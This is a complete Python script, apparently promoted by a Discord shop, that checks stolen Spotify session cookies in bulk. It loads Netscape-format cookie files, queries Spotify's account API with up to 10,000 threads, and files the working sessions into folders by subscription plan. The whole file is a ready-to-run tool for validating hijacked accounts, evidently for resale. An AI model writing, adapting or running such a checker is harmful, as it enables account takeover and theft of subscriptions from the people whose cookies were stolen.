import os, requests, threading, sys
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init(autoreset=True)

COOKIES_DIR  = "cookies"
RESULTS_DIR  = "Resultados"
THREADS      = 10_000

PLAN_NAMES = {
    "duo_premium":          "Premium Duo",
    "family_premium_v2":    "Premium Familiar",
    "premium":              "Premium Individual",
    "premium_mini":         "Premium Mini",
    "student_premium":      "Premium Student",
    "student_premium_hulu": "Student + Hulu",
    "free":                 "Free",
}

PLAN_COLORS = {
    "Premium Duo":          Fore.CYAN,
    "Premium Familiar":     Fore.MAGENTA,
    "Premium Individual":   Fore.BLUE,
    "Premium Mini":         Fore.LIGHTBLUE_EX,
    "Premium Student":      Fore.LIGHTMAGENTA_EX,
    "Student + Hulu":       Fore.LIGHTCYAN_EX,
    "Free":                 Fore.WHITE,
}

good = bad = errors = 0
plan_counter = defaultdict(int)
lock = threading.Lock()
STATUS_LINES = 4 + len(PLAN_NAMES)

def banner():
    fox = r"""                         ,.---.   
               ,,,,     /    _ `.
                \\\\   /      \  )
                 |||| /\/``-.__\/
                 ::::/\/_
 {{`-.__.-'(`(^^(^^^(^ 9 `.========='      
{{{{{{ { ( ( (  (   (-----:=    Discord.gg/KayyShopV2
 {{.-'~~'-.(,(,,(,,,(__6_.'=========.
                 ::::\/\ 
                 |||| \/\  ,-'/\ 
                ////   \ `` _/  )
               ''''     \  `   / 
                         `---''"""
    print(Fore.YELLOW + fox + Style.RESET_ALL)

def plan_pretty(code):
    return PLAN_NAMES.get(code, code or "Unknown")

def color_num(n, colour):
    return f"{colour}{n}{Style.RESET_ALL}"

def print_initial_status():
    banner()
    sys.stdout.write(f"  {Fore.GREEN}Válidas   : 0{Style.RESET_ALL}\n")
    sys.stdout.write(f"  {Fore.YELLOW}Inválidas : 0{Style.RESET_ALL}\n")
    sys.stdout.write(f"  {Fore.RED}Errores   : 0{Style.RESET_ALL}\n\n")
    for pretty in PLAN_NAMES.values():
        col = PLAN_COLORS.get(pretty, Fore.WHITE)
        sys.stdout.write(f"  {pretty:<18}: {col}0{Style.RESET_ALL}\n")
    sys.stdout.flush()

def refresh_status():
    sys.stdout.write(f"\033[{STATUS_LINES}A")
    sys.stdout.write(f"  {Fore.GREEN}Válidas   : {good}{Style.RESET_ALL}\n")
    sys.stdout.write(f"  {Fore.YELLOW}Inválidas : {bad}{Style.RESET_ALL}\n")
    sys.stdout.write(f"  {Fore.RED}Errores   : {errors}{Style.RESET_ALL}\n\n")
    for pretty in PLAN_NAMES.values():
        col = PLAN_COLORS.get(pretty, Fore.WHITE)
        sys.stdout.write(f"  {pretty:<18}: {col}{plan_counter[pretty]}{Style.RESET_ALL}\n")
    sys.stdout.flush()

def netscape_to_dict(raw):
    ck = {}
    for line in raw.splitlines():
        if line and not line.startswith("#"):
            parts = line.split("\t")
            if len(parts) >= 7:
                ck[parts[5]] = parts[6]
    return ck

def fetch_info(sess):
    url = "https://www.spotify.com/eg-ar/api/account/v1/datalayer"
    r = sess.get(url, timeout=15)
    if r.headers.get("Content-Type", "").startswith("application/json"):
        return r.json()
    return None

def check(path):
    global good, bad, errors
    try:
        raw = open(path, encoding="utf-8").read()
        sess = requests.Session()
        sess.cookies.update(netscape_to_dict(raw))
        sess.headers.update({"Accept-Encoding": "identity"})
        data = fetch_info(sess)
        with lock:
            if data and "currentPlan" in data:
                pretty = plan_pretty(data["currentPlan"])
                dest_dir = os.path.join(RESULTS_DIR, pretty)
                os.makedirs(dest_dir, exist_ok=True)
                dest_file = os.path.join(dest_dir, os.path.basename(path))
                with open(dest_file, "w", encoding="utf-8") as f_out:
                    f_out.write(raw)
                good += 1
                plan_counter[pretty] += 1
                refresh_status()
            else:
                bad += 1
                refresh_status()
    except Exception:
        with lock:
            errors += 1
            refresh_status()

def main():
    for pretty in PLAN_NAMES.values():
        os.makedirs(os.path.join(RESULTS_DIR, pretty), exist_ok=True)
    files = [os.path.join(COOKIES_DIR, f) for f in os.listdir(COOKIES_DIR) if f.lower().endswith(".txt")]
    print_initial_status()
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        fut = [ex.submit(check, p) for p in files]
        for _ in as_completed(fut):
            pass
    sys.stdout.write("\n" + Fore.GREEN + Style.BRIGHT + "✔ Chequeo terminado — disfruta tu música!" + Style.RESET_ALL + "\n")

if __name__ == "__main__":
    main()
